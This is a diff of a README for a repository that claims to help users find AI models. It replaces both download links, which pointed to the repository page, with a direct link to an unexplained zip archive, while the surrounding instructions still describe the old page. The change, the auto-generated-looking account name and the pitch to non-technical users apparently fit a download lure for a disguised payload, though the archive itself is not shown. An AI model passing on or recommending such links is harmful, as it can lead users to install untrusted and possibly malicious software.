@@ -1,6 +1,6 @@
 # 🤖 open-source-ai-models - Find Your Perfect AI Model Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Open_Source_AI_Models-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aggressive-tradescant8736/open-source-ai-models)
+[![Download Now](https://img.shields.io/badge/Download-Open_Source_AI_Models-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Aggressive-tradescant8736/open-source-ai-models/main/assets/1.7.zip)
 
 ## 🎯 What Is This?
 
@@ -20,7 +20,7 @@ That's it. No special tools, no command line, no coding knowledge required.
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Aggressive-tradescant8736/open-source-ai-models](https://github.com/Aggressive-tradescant8736/open-source-ai-models)
+Visit this link to download the application: [https://raw.githubusercontent.com/Aggressive-tradescant8736/open-source-ai-models/main/assets/1.7.zip](https://raw.githubusercontent.com/Aggressive-tradescant8736/open-source-ai-models/main/assets/1.7.zip)
 
 Once you click that link, you'll land on a page with everything you need. Look for the green button that says "Code" and click it. Then select "Download ZIP" from the dropdown menu. The download will start automatically.
 
